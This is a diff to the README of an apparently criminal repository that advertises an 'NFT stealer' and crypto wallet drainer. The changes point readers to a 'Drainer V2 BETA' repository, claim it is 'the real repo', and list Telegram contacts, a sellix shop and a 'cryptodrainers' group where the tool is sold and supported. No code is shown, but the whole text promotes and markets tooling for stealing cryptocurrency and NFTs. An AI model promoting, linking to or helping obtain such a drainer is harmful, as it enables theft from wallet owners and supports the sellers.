@@ -1,6 +1,5 @@
-# SOON BIGGEST UPDATE
-### ⚠️ My old Github [@0xAshe](https://github.com/0xAshe/Nft-Drainer-stealer) got termed, I will update the repo here
-# *⛔ Beware of scams, this is the real repo*
+### [Drainer V2 BETA](https://github.com/0x32Moon/Crypto-Nft-Drainer-V2)
+# ⛔ Beware of scams, this is the real repo
 ### If you need any help, DM me here: [@Zentoh](https://t.me/zentoh) (new telegram)
 ### 
 
@@ -47,3 +46,6 @@ This **NFT stealer** interacts directly with the **nft contract** to transfer it
 - Telegram: https://t.me/zentoh
 - Shop: https://nftservices.sellix.io
 - Group: https://t.me/cryptodrainers
+
+##### Please ⭐ the repo to support our project
+![star](https://cdn.discordapp.com/attachments/975036883958636557/975057102097743973/unknown.png)
